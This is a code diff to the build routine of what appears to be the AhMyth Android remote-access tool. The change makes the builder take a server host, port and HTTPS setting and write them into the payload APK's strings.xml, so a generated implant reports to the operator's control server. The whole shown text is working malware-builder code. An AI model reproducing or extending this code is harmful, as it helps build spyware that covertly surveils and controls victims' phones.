@@ -285,35 +285,40 @@ app.controller("AppCtrl", ($scope) => {
 
     }
 
-    // fired when user click build buttom
-    // collect the ip and port and start building
-    $appCtrl.Build = (ip, port) => {
-        if (!ip) {
-            $appCtrl.Log('IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
+    // fired when user click build button
+    // collect the host, port and https setting and start building
+    $appCtrl.Build = (host, port, useHttps) => {
+        if (!host) {
+            $appCtrl.Log('Server Host Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
             return;
         } else if (!port) {
             port = CONSTANTS.defaultPort;
-        } else if (port > 65535 || port <= 1024) {
-            $appCtrl.Log('Choose ports from range (1024,65535)', CONSTANTS.logStatus.FAIL);
+        } else if (port > 65535 || port <= 1) {
+            $appCtrl.Log('Choose ports from range (1,65535)', CONSTANTS.logStatus.FAIL);
             return;
         }
 
-
-        // open ahmyth source file and modifiy the ip and port to the users' ones
-        var ipPortFile = path.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
-        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkName + '...');
-        fs.readFile(ipPortFile, 'utf8', (error, data) => {
+        var scheme = useHttps ? "https://" : "http://";
+        
+        // Update strings.xml with new server host and port
+        var stringsFile = path.join(CONSTANTS.ahmythApkFolderPath, 'app/src/main/res/values/strings.xml');
+        $appCtrl.Log('Reading strings.xml file from ' + CONSTANTS.apkName + '...');
+        fs.readFile(stringsFile, 'utf8', (error, data) => {
             if (error) {
-                $appCtrl.Log('Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log('Reading strings.xml Failed', CONSTANTS.logStatus.FAIL);
                 return;
             }
 
-            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkName + '...');
-            $appCtrl.Log('Adding source ip:port to ' + ipPortFile + '...');
-            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
-            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
+            $appCtrl.Log('Updating server host and port in strings.xml...');
+            
+            // Replace server_ip
+            var result = data.replace(/<string name="server_ip">.*?<\/string>/g, '<string name="server_ip">' + host + '</string>');
+            // Replace server_port
+            result = result.replace(/<string name="server_port">.*?<\/string>/g, '<string name="server_port">' + port + '</string>');
+            
+            fs.writeFile(stringsFile, result, 'utf8', (error) => {
                 if (error) {
-                    $appCtrl.Log('Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log('Updating strings.xml Failed', CONSTANTS.logStatus.FAIL);
                     return;
                 }
 
